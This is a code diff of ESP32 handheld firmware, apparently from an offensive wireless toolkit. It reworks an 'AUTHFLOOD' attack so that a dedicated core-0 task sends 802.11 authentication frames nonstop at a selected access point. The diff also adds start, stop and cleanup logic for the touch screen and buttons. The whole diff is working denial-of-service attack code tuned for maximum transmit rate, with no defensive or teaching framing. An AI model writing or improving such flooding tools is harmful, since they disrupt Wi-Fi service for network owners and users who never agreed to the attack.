+// ───────────────────────────────────────────────────────────────────────────
+static void afTxTask(void* param) {
+    #if CYD_DEBUG
+    Serial.println("[AUTHFLOOD] Core 0: TX task started");
+    #endif
+
+    // Set channel once — doesn't change during attack
+    esp_wifi_set_channel(targetAp.primary, WIFI_SECOND_CHAN_NONE);
+
+    int yieldCounter = 0;
+
+    while (afTxTaskRunning) {
+        sendAuthFrame();
+
+        // Feed watchdog — yield every 50 frames
+        yieldCounter++;
+        if (yieldCounter >= 50) {
+            yieldCounter = 0;
+            vTaskDelay(1);
+        }
+    }
+
+    #if CYD_DEBUG
+    Serial.println("[AUTHFLOOD] Core 0: TX task exiting");
+    #endif
+
+    afTxTaskDone = true;
+    vTaskDelete(NULL);
+}
+
+static void startAfTask() {
+    afTxTaskDone = false;
+    afTxTaskRunning = true;
+    xTaskCreatePinnedToCore(afTxTask, "AuthFloodTX", 8192, NULL, 1, &afTxTaskHandle, 0);
+
+    #if CYD_DEBUG
+    Serial.printf("[AUTHFLOOD] DUAL-CORE Started — CH: %d, Core 0 TX task launched\n", targetAp.primary);
+    #endif
+}
+
+static void stopAfTask() {
+    afTxTaskRunning = false;
+
+    if (afTxTaskHandle) {
+        unsigned long waitStart = millis();
+        while (!afTxTaskDone && (millis() - waitStart < 500)) {
+            vTaskDelay(10 / portTICK_PERIOD_MS);
+        }
+        afTxTaskHandle = NULL;
+    }
+
+    #if CYD_DEBUG
+    Serial.println("[AUTHFLOOD] Core 0 TX task stopped");
+    #endif
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -2819,6 +3166,7 @@ void loop() {
             if (ty >= 20 && ty <= 36) {
                 if (tx < 40) {  // Back — go to scan screen first, then exit
                     if (attackRunning) {
+                        stopAfTask();  // Kill Core 0 task first
                         attackRunning = false;
                         afExitAttackMode();
                     }
@@ -2834,6 +3182,7 @@ void loop() {
                 }
                 if (tx >= 200) {  // Rescan
                     if (attackRunning) {
+                        stopAfTask();  // Kill Core 0 task first
                         attackRunning = false;
                         afExitAttackMode();
                     }
@@ -2849,7 +3198,7 @@ void loop() {
             if (targetSelected && ty >= 100 && ty <= 134 && tx >= 20 && tx <= 220) {
                 if (now - lastStateChange > STATE_CHANGE_COOLDOWN) {
                     if (!attackRunning) {
-                        // Start attack via touch
+                        // Start attack via touch — init radio, launch Core 0 TX task
                         if (!afInitAttackMode(targetAp.primary)) {
                             tft.fillRect(10, 270, 220, 12, HALEHOUND_BLACK);
                             tft.setTextColor(HALEHOUND_HOTPINK);
@@ -2858,19 +3207,21 @@ void loop() {
                             lastTap = now;
                             return;
                         }
-                        attackRunning = true;
                         packetCount = 0;
                         successCount = 0;
                         uniqueMACs = 0;
                         attackStartTime = now;
+                        attackRunning = true;
+                        startAfTask();
                         lastStateChange = now;
                         drawActionButton(true);
                         #if CYD_DEBUG
-                        Serial.printf("[AUTHFLOOD] Attack started (touch) on CH%d %s\n",
+                        Serial.printf("[AUTHFLOOD] DUAL-CORE attack started (touch) on CH%d %s\n",
                                       targetAp.primary, targetAp.ssid);
                         #endif
                     } else {
-                        // Stop attack via touch
+                        // Stop attack via touch — kill Core 0 task first
+                        stopAfTask();
                         attackRunning = false;
                         afExitAttackMode();
                         lastStateChange = now;
@@ -2886,6 +3237,7 @@ void loop() {
     // Hardware BACK button
     if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
         if (attackRunning) {
+            stopAfTask();  // Kill Core 0 task first
             attackRunning = false;
             afExitAttackMode();
         }
@@ -2965,11 +3317,12 @@ void loop() {
                 lastStateChange = now;
                 return;
             }
-            attackRunning = true;
             packetCount = 0;
             successCount = 0;
             uniqueMACs = 0;
             attackStartTime = now;
+            attackRunning = true;
+            startAfTask();
             lastStateChange = now;
 
             // Redraw button as STOP + clear standby content
@@ -2978,16 +3331,17 @@ void loop() {
             tft.drawLine(5, 140, SCREEN_WIDTH - 5, 140, HALEHOUND_DARK);
 
             #if CYD_DEBUG
-            Serial.printf("[AUTHFLOOD] Attack started on CH%d %s\n",
+            Serial.printf("[AUTHFLOOD] DUAL-CORE attack started on CH%d %s\n",
                           targetAp.primary, targetAp.ssid);
             #endif
         }
 
     } else {
-        // ── ATTACKING ──
+        // ── ATTACKING — Core 1 display only, Core 0 handles all TX ──
         // Debounce guard: ignore SELECT for 300ms after state change
         if (buttonPressed(BTN_SELECT) && (now - lastStateChange > STATE_CHANGE_COOLDOWN)) {
-            // Stop attack
+            // Stop attack — kill Core 0 task first
+            stopAfTask();
             attackRunning = false;
             afExitAttackMode();
             lastStateChange = now;
@@ -2995,12 +3349,8 @@ void loop() {
             return;
         }
 
-        // Send burst of auth frames
-        for (int i = 0; i < 10; i++) {
-            sendAuthFrame();
-        }
-
-        // Update display every 100ms
+        // Equalizer + stats — 50ms throttle (reads volatile counters from Core 0)
+        // No TX calls here — Core 0 task sends auth frames at full speed
         static unsigned long lastDisplayUpdate = 0;
         if (now - lastDisplayUpdate >= 50) {
             lastDisplayUpdate = now;
@@ -3012,8 +3362,12 @@ void loop() {
 bool isExitRequested() { return exitRequested; }
 
 void cleanup() {
-    if (attackRunning) {
-        attackRunning = false;
+    // Stop Core 0 TX task if running
+    if (attackRunning || afTxTaskRunning) {
+        stopAfTask();
+    }
+    attackRunning = false;
+    if (inAttackMode) {
         afExitAttackMode();
     }
     if (afApList) { free(afApList); afApList = nullptr; }
@@ -3027,7 +3381,7 @@ void cleanup() {
     WiFi.mode(WIFI_OFF);
 
     #if CYD_DEBUG
-    Serial.println("[AUTHFLOOD] Cleanup complete");
+    Serial.println("[AUTHFLOOD] Cleanup complete — all Core 0 tasks terminated");
     #endif
 }
 
